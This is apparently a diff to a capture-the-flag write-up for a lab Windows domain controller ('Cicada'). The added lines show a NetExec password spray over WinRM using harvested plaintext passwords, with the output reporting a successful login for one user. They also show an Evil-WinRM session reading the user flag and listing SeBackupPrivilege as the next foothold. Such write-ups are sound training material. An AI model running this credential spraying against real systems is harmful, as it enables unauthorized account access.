@@ -256,11 +256,54 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
+She can login via winrm
+```bash
+nxc winrm 'CICADA-DC' -u users.txt  -p creds.txt  -d 'cicada.local'                 
+WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\emily.oscars:aRt$Lp#7t*VQ!3
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Administrator:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\Guest:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\john.smoulder:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\sarah.dantelia:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\michael.wrightson:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.local\david.orelious:Q!3@Lp#M6b*7t*Vt
+WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.local\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
+```
 
 
+User flag was on her Desktop
+```powershell
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> more ../Desktop/user.txt
+```
 
+She has `SeBackupPrivilege`
+```powershell
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
 
+PRIVILEGES INFORMATION
+----------------------
 
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
 
 ## Enumeration
 
